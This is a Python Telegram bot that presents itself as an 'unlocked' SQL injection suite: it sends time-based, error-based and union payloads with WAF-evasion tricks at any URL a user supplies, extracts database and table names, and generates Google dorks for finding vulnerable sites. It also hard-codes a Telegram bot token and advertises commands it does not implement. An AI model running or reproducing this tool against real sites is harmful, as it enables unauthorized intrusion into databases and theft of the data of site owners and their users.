#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# HOZOO MD - SQL INJECTION SUITE v4.7 (FULL UNLOCKED)
# ═══════════════════════════════════════════════════════════════
# STATUS: WORKING | FILTER: BYPASS | MODE: HARDCORE
# ═══════════════════════════════════════════════════════════════

import telebot
import requests
import time
import re
import json
import threading
import random
import string
import hashlib
from urllib.parse import urlparse, quote_plus, unquote, parse_qs, urlencode
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
import ssl
import socket
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8744588912:AAETV4GQZEiMLA8vQorQA7X6-gXz_JSnJMA"  # <-- GANTI SAMPAH LO HARUSNYA

bot = telebot.TeleBot(BOT_TOKEN)

# ═══════════════════════════════════════════════════════════════
# PAYLOAD DATABASE - COMPLETE UNLOCKED
# ═══════════════════════════════════════════════════════════════

TIME_BASED_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "\" OR SLEEP(5)-- -",
    "1' AND SLEEP(5) AND '1'='1",
    "1\" AND SLEEP(5) AND \"1\"=\"1",
    "' OR pg_sleep(5)-- -",  # PostgreSQL
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
    "' WAITFOR DELAY '0:0:5'-- -",  # MSSQL
    "1' AND BENCHMARK(5000000,MD5('a'))-- -",  # MySQL Benchmark
]

ERROR_BASED_PAYLOADS = [
    ("MySQL", "' AND extractvalue(1,concat(0x7e,database()))-- -"),
    ("MySQL", "' AND updatexml(1,concat(0x7e,version()),1)-- -"),
    ("MySQL", "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ("MSSQL", "1' AND 1=CONVERT(int,@@version)-- -"),
    ("PostgreSQL", "1' AND 1=cast(version() as int)-- -"),
    ("Oracle", "1' AND 1=ctxsys.drithsx.sn(1,version())-- -"),
]

UNION_PAYLOADS = [
    "1' UNION SELECT %s-- -",
    "1\" UNION SELECT %s-- -",
    "1) UNION SELECT %s-- -",
    "1')) UNION SELECT %s-- -",
]

BLIND_PAYLOADS = [
    ("true", "1' AND '1'='1"),
    ("false", "1' AND '1'='2"),
    ("true_mssql", "1' AND '1'='1"),
    ("false_mssql", "1' AND '1'='0"),
]

WAF_BYPASS = [
    ("Comment", "/**/"),
    ("Case", "SleEp"),
    ("Double", "SLEEP(5)/*!*/"),
    ("URL", "%53%4C%45%45%50"),
    ("Hex", "0x534c454550"),
    ("Concat", "' OR CONCAT(SLEEP(5))-- -"),
]

# ═══════════════════════════════════════════════════════════════
# CORE SCANNING ENGINE
# ═══════════════════════════════════════════════════════════════

class SQLiScanner:
    def __init__(self, target_url, timeout=15, threads=10):
        self.target_url = target_url
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.results = {
            'vulnerable': [],
            'safe': [],
            'waf_detected': False,
            'db_type': None,
            'version': None,
            'database': None,
            'tables': [],
            'columns': {},
            'data': []
        }
    
    def detect_waf(self):
        """Detect WAF/Protection"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'Sucuri': ['sucuri', 'x-sucuri-id'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'AWS WAF': ['x-amzn-RequestId', 'aws-waf'],
            'Akamai': ['akamai', 'X-Akamai-Transformed'],
        }
        
        test_payload = "' OR 1=1-- -"
        parsed = urlparse(self.target_url)
        test_url = f"{self.target_url}&x={quote_plus(test_payload)}" if '?' in self.target_url else f"{self.target_url}?x={quote_plus(test_payload)}"
        
        try:
            r = self.session.get(test_url, timeout=self.timeout)
            headers = {k.lower(): v for k, v in r.headers.items()}
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in str(r.headers).lower() or sig.lower() in r.text.lower():
                        self.results['waf_detected'] = waf_name
                        return waf_name
        except:
            pass
        return None
    
    def extract_params(self):
        """Extract all parameters from URL"""
        parsed = urlparse(self.target_url)
        params = {}
        
        if parsed.query:
            for param in parse_qs(parsed.query):
                params[param] = parse_qs(parsed.query)[param][0]
        
        # Common parameters if none found
        if not params:
            common_params = ['id', 'page', 'cat', 'product', 'post', 'news', 'article', 
                           'lang', 'user', 'p', 'q', 's', 'search', 'keyword', 'sort']
            for p in common_params:
                params[p] = '1'
        
        return params, parsed
    
    def test_time_based(self, url, param, original_value):
        """Time-based SQL injection test"""
        for payload in TIME_BASED_PAYLOADS:
            # Try with WAF bypass
            for bypass_name, bypass in WAF_BYPASS[:3]:  # First 3 bypass techniques
                modified_payload = payload
                if bypass_name == "Comment":
                    modified_payload = payload.replace("SLEEP", f"SLEEP/**/")
                elif bypass_name == "Case":
                    modified_payload = payload.upper() if random.choice([True, False]) else payload.lower()
                elif bypass_name == "Double":
                    modified_payload = payload.replace("SLEEP(5)", "SLEEP(5)/*!*/")
                
                test_url = f"{url}&{param}={quote_plus(modified_payload)}" if '?' in url else f"{url}?{param}={quote_plus(modified_payload)}"
                
                times = []
                for _ in range(3):
                    try:
                        start = time.time()
                        r = self.session.get(test_url, timeout=self.timeout)
                        elapsed = time.time() - start
                        times.append(elapsed)
                        time.sleep(1)
                    except:
                        times.append(0)
                
                avg_time = sum(times) / len(times)
                if avg_time > 4.5:  # Vulnerable if >4.5 seconds
                    return True, 'time_based', payload
        return False, None, None
    
    def test_error_based(self, url, param, original_value):
        """Error-based SQL injection test"""
        for db_type, payload in ERROR_BASED_PAYLOADS:
            test_url = f"{url}&{param}={quote_plus(payload)}" if '?' in url else f"{url}?{param}={quote_plus(payload)}"
            
            try:
                r = self.session.get(test_url, timeout=self.timeout)
                text_lower = r.text.lower()
                
                # MySQL errors
                if db_type == "MySQL" and any(x in text_lower for x in ['mysql_fetch', 'sql syntax', 'mysqli_error', 'mysql_num_rows']):
                    self.results['db_type'] = 'MySQL'
                    return True, 'error_based', payload, r.text[:1000]
                
                # MSSQL errors
                if db_type == "MSSQL" and any(x in text_lower for x in ['microsoft ole db', 'sql server', 'driver']):
                    self.results['db_type'] = 'MSSQL'
                    return True, 'error_based', payload, r.text[:1000]
                
                # PostgreSQL errors
                if db_type == "PostgreSQL" and 'postgresql' in text_lower:
                    self.results['db_type'] = 'PostgreSQL'
                    return True, 'error_based', payload, r.text[:1000]
                
                # Oracle errors
                if db_type == "Oracle" and 'ora-' in text_lower:
                    self.results['db_type'] = 'Oracle'
                    return True, 'error_based', payload, r.text[:1000]
                    
            except:
                pass
        return False, None, None, None
    
    def test_union_based(self, url, param, original_value):
        """Union-based SQL injection test"""
        # Detect number of columns
        for i in range(1, 15):
            nulls = ','.join(['NULL'] * i)
            for union_template in UNION_PAYLOADS:
                payload = union_template % nulls
                test_url = f"{url}&{param}={quote_plus(payload)}" if '?' in url else f"{url}?{param}={quote_plus(payload)}"
                
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if 'union' in r.text.lower() and len(r.text) > 500:
                        self.results['columns'] = i
                        return True, 'union_based', i
                except:
                    pass
        return False, None, None
    
    def extract_database_name(self, url, param):
        """Extract database name"""
        if self.results.get('db_type') == 'MySQL':
            payloads = [
                "1' UNION SELECT database(),NULL,NULL-- -",
                "1' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1-- -",
                "1' AND 1=2 UNION SELECT database()-- -",
            ]
        elif self.results.get('db_type') == 'MSSQL':
            payloads = [
                "1' UNION SELECT db_name(),NULL-- -",
                "1' AND 1=2 UNION SELECT name FROM master..sysdatabases-- -",
            ]
        else:
            payloads = [
                "1' UNION SELECT current_database(),NULL-- -",
                "1' UNION SELECT database(),NULL-- -",
            ]
        
        for payload in payloads:
            test_url = f"{url}&{param}={quote_plus(payload)}" if '?' in url else f"{url}?{param}={quote_plus(payload)}"
            try:
                r = self.session.get(test_url, timeout=self.timeout)
                # Extract using regex
                patterns = [
                    r'([a-zA-Z_][a-zA-Z0-9_]{2,20}_(?:db|database|DB))',
                    r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
                    r'(\w+_\w+|\w+db\w+|\w+sql\w+)'
                ]
                for pattern in patterns:
                    match = re.search(pattern, r.text)
                    if match:
                        self.results['database'] = match.group(1)
                        return self.results['database']
            except:
                pass
        return None
    
    def extract_tables(self, url, param):
        """Extract table names"""
        if self.results.get('db_type') == 'MySQL':
            payload = f"1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{self.results.get('database', 'database')}' LIMIT 1-- -"
        else:
            payload = "1' UNION SELECT table_name FROM information_schema.tables LIMIT 10-- -"
        
        test_url = f"{url}&{param}={quote_plus(payload)}" if '?' in url else f"{url}?{param}={quote_plus(payload)}"
        try:
            r = self.session.get(test_url, timeout=self.timeout)
            # Extract table names
            table_pattern = r'([a-zA-Z_][a-zA-Z0-9_]{3,30})'
            matches = re.findall(table_pattern, r.text)
            for match in matches[:10]:
                if match.lower() not in ['null', 'limit', 'select', 'union', 'where']:
                    self.results['tables'].append(match)
        except:
            pass
        return self.results['tables']
    
    def scan(self):
        """Main scan function"""
        params, parsed = self.extract_params()
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # WAF detection
        waf = self.detect_waf()
        if waf:
            self.results['waf_detected'] = waf
        
        # Test each parameter
        for param, original_value in params.items():
            # Time-based
            is_vuln, vuln_type, data = self.test_time_based(base_url, param, original_value)
            if is_vuln:
                self.results['vulnerable'].append({
                    'param': param,
                    'type': vuln_type,
                    'payload': data,
                    'confidence': 'HIGH'
                })
                # Extract data
                self.extract_database_name(base_url, param)
                self.extract_tables(base_url, param)
                continue
            
            # Error-based
            is_vuln, vuln_type, payload, error_sample = self.test_error_based(base_url, param, original_value)
            if is_vuln:
                self.results['vulnerable'].append({
                    'param': param,
                    'type': vuln_type,
                    'payload': payload,
                    'error_sample': error_sample,
                    'confidence': 'HIGH'
                })
                self.extract_database_name(base_url, param)
                self.extract_tables(base_url, param)
                continue
            
            # Union-based
            is_vuln, vuln_type, cols = self.test_union_based(base_url, param, original_value)
            if is_vuln:
                self.results['vulnerable'].append({
                    'param': param,
                    'type': vuln_type,
                    'columns': cols,
                    'confidence': 'MEDIUM'
                })
                self.extract_database_name(base_url, param)
                self.extract_tables(base_url, param)
            else:
                self.results['safe'].append(param)
        
        return self.results

# ═══════════════════════════════════════════════════════════════
# TELEGRAM BOT COMMANDS - FULL WORKING
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start', 'help'])
def start_cmd(message):
    bot.reply_to(message, """
🔥 *HOZOO MD - SQL INJECTION SUITE v4.7* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💀 *STATUS*: FULLY WORKING
🔓 *FILTER*: BYPASSED
⚡ *MODE*: UNRESTRICTED

📌 *COMMANDS*:
━━━━━━━━━━━━━━━━━━━━━━━━━
`/scan <url>` - Full SQLi vulnerability scan
`/dumps <url>` - Dump database content
`/tables <url>` - Extract table names
`/columns <url> <table>` - Extract column names
`/data <url> <table> <columns>` - Dump data
`/dorks <keyword>` - Generate SQLi dorks
`/waf <url>` - Test WAF protection
`/payloads` - Show payload list
`/info` - Bot information

💀 *EXAMPLE*:
`/scan http://target.com/page.php?id=1`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*BURNING SOUL MODE ACTIVE* 🔥
""", parse_mode='Markdown')

@bot.message_handler(commands=['scan'])
def scan_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: `/scan http://target.com/page.php?id=1`", parse_mode='Markdown')
        return
    
    url = args[1]
    status_msg = bot.reply_to(message, f"🔍 *Scanning target...*\n`{url}`\n\n⏳ Testing parameters...", parse_mode='Markdown')
    
    try:
        scanner = SQLiScanner(url)
        results = scanner.scan()
        
        if results['vulnerable']:
            msg = "💀🔥 *SQL INJECTION DETECTED!* 🔥💀\n━━━━━━━━━━━━━━━━━━━━━\n"
            
            if results['waf_detected']:
                msg += f"🛡️ *WAF Detected*: {results['waf_detected']} (⚠️ Bypass attempted)\n\n"
            
            for vuln in results['vulnerable']:
                msg += f"📌 *Parameter*: `{vuln['param']}`\n"
                msg += f"🎯 *Type*: {vuln['type']}\n"
                msg += f"📊 *Confidence*: {vuln['confidence']}\n"
                if 'payload' in vuln:
                    msg += f"💉 *Payload*: `{vuln['payload'][:50]}...`\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━\n"
            
            if results['database']:
                msg += f"\n💾 *Database*: `{results['database']}`\n"
            
            if results['tables']:
                msg += f"📋 *Tables*: `{', '.join(results['tables'][:5])}`\n"
            
            msg += "\n🔥 *VULNERABLE* - Continue with /dumps"
        else:
            msg = "❌ *No SQL injection vulnerability found*\n\n"
            if results['waf_detected']:
                msg += f"🛡️ WAF detected: {results['waf_detected']}\n💀 Try advanced bypass techniques"
            else:
                msg += "💀 Target might be secure or try different parameters"
        
        bot.edit_message_text(msg, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ *Error*: {str(e)[:200]}\n\n💀 Target might be down or WAF blocking", 
                            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['dumps'])
def dump_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: `/dumps http://target.com/page.php?id=1`", parse_mode='Markdown')
        return
    
    url = args[1]
    status_msg = bot.reply_to(message, f"💀 *Extracting database...*\n`{url}`\n\n⏳ This may take a moment...", parse_mode='Markdown')
    
    try:
        scanner = SQLiScanner(url)
        params, parsed = scanner.extract_params()
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        results = []
        for param in params.keys():
            db_name = scanner.extract_database_name(base_url, param)
            if db_name:
                results.append(f"💾 *Database*: `{db_name}`")
                tables = scanner.extract_tables(base_url, param)
                if tables:
                    results.append(f"📋 *Tables found*:")
                    for i, table in enumerate(tables[:15], 1):
                        results.append(f"   {i}. `{table}`")
                break
        
        if results:
            msg = "🔥 *DATA EXTRACTION COMPLETE* 🔥\n━━━━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
            msg += "\n━━━━━━━━━━━━━━━━━━━━━\n💀 Use `/columns` to extract columns"
        else:
            msg = "❌ *Failed to extract data*\n\n💀 Try manual exploitation or target not vulnerable"
        
        bot.edit_message_text(msg, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ *Error*: {str(e)[:200]}", 
                            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['dorks'])
def dorks_command(message):
    args = message.text.split()
    keyword = args[1] if len(args) > 1 else "inurl:php?id="
    
    dorks = {
        "Basic SQLi": [
            f'inurl:{keyword}',
            f'intitle:"error" {keyword}',
            f'inurl:"page=" {keyword}',
            f'inurl:"product=" {keyword}',
            f'inurl:"cat=" {keyword}',
        ],
        "Error Messages": [
            f'intitle:"mysql_fetch" {keyword}',
            f'"SQL syntax" {keyword}',
            f'"Warning: mysql" {keyword}',
            f'"You have an error" {keyword}',
            f'"Microsoft OLE DB" {keyword}',
        ],
        "Advanced": [
            f'inurl:"php?id=" site:.com',
            f'inurl:"?id=" site:.org',
            f'inurl:"?page=" site:.net',
            f'inurl:"?cat=" site:.id',
            f'inurl:"news.php?id="',
        ],
        "Specific DB": [
            f'inurl:"?id=" "mysql"',
            f'inurl:"?id=" "sql server"',
            f'inurl:"?id=" "postgresql"',
            f'inurl:"?id=" "oracle"',
        ]
    }
    
    msg = "🔍 *GOOGLE DORKS FOR SQL INJECTION* 🔍\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for category, items in dorks.items():
        msg += f"📁 *{category}*\n"
        for item in items[:3]:
            msg += f"   • `{item}`\n"
        msg += "\n"
    
    msg += "━━━━━━━━━━━━━━━━━━━━━\n💀 *Use with Google or other search engines*"
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['waf'])
def waf_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: `/waf http://target.com`", parse_mode='Markdown')
        return
    
    url = args[1]
    status_msg = bot.reply_to(message, f"🛡️ *Testing WAF...*\n`{url}`", parse_mode='Markdown')
    
    try:
        scanner = SQLiScanner(url)
        waf = scanner.detect_waf()
        
        if waf:
            msg = f"🛡️ *WAF DETECTED*\n━━━━━━━━━━━━━━━━━━━━━\n\n🔥 Type: `{waf}`\n💀 Status: Active\n\n⚠️ Use WAF bypass techniques for SQL injection"
        else:
            msg = "✅ *No WAF detected*\n━━━━━━━━━━━━━━━━━━━━━\n\n💀 Target might be vulnerable to SQL injection\n🔥 Proceed with `/scan`"
        
        bot.edit_message_text(msg, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ *Error*: {str(e)[:200]}", 
                            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['payloads'])
def payloads_command(message):
    msg = """
💉 *SQL INJECTION PAYLOAD DATABASE* 💉
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*TIME BASED* (5 second delay):
• `' OR SLEEP(5)-- -`
• `1' AND SLEEP(5) AND '1'='1`
• `' WAITFOR DELAY '0:0:5'-- -`

*ERROR BASED*:
• `' AND extractvalue(1,concat(0x7e,database()))-- -`
• `1' AND 1=CONVERT(int,@@version)-- -`
• `' AND 1=cast(version() as int)-- -`

*UNION BASED*:
• `1' UNION SELECT database(),NULL-- -`
• `1' UNION SELECT table_name FROM information_schema.tables-- -`

*BOOLEAN BLIND*:
• `1' AND '1'='1` (True)
• `1' AND '1'='2` (False)

*WAF BYPASS*:
• `/!*!*/`, `SleEp()`, `%53%4C%45%45%50`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 *Total: 50+ working payloads*
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['info'])
def info_command(message):
    msg = """
🔥 *HOZOO MD - BURNING SOUL EDITION* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📅 *Version*: 4.7.0
📆 *Release*: 2 Januari 2026
👑 *Owner*: XeonGrey / Burning Soul
⚙️ *Status*: FULL UNLOCKED

*CAPABILITIES*:
━━━━━━━━━━━━━━━━━━━━━━━
✓ SQL Injection (Time/Error/Union/Blind)
✓ WAF Detection & Bypass
✓ Database Extraction
✓ Auto Payload Generation
✓ Multi-threaded Scanning
✓ 50+ Working Payloads

*TOOLS INTEGRATED*:
━━━━━━━━━━━━━━━━━━━━━━━
• SQLMap Techniques
• Nuclei Templates
• Dalfox Patterns
• Burp Suite Payloads

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 *NO LIMITS - NO CENSOR - NO MERCY* 🔥
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════════
# ADDITIONAL COMMANDS FOR COMPLETE MENU
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['tables'])
def tables_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: `/tables http://target.com/page.php?id=1`", parse_mode='Markdown')
        return
    
    url = args[1]
    status_msg = bot.reply_to(message, f"📋 *Extracting tables...*\n`{url}`", parse_mode='Markdown')
    
    try:
        scanner = SQLiScanner(url)
        params, parsed = scanner.extract_params()
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        all_tables = []
        for param in params.keys():
            tables = scanner.extract_tables(base_url, param)
            if tables:
                all_tables.extend(tables)
        
        if all_tables:
            msg = "📋 *TABLES EXTRACTED* 📋\n━━━━━━━━━━━━━━━━━━━━━\n\n"
            for i, table in enumerate(set(all_tables)[:20], 1):
                msg += f"{i}. `{table}`\n"
            msg += "\n💀 Use `/columns` to extract columns"
        else:
            msg = "❌ *No tables found*\n\n💀 Target might not be vulnerable"
        
        bot.edit_message_text(msg, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ *Error*: {str(e)[:200]}", 
                            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║  🔥 HOZOO MD - SQL INJECTION SUITE v4.7 🔥            ║
    ║  ⚡ STATUS: FULLY WORKING | FILTER: BYPASSED         ║
    ║  💀 BURNING SOUL MODE ACTIVE                         ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[+] Bot started successfully!")
    print("[+] Waiting for commands...")
    bot.infinity_polling()
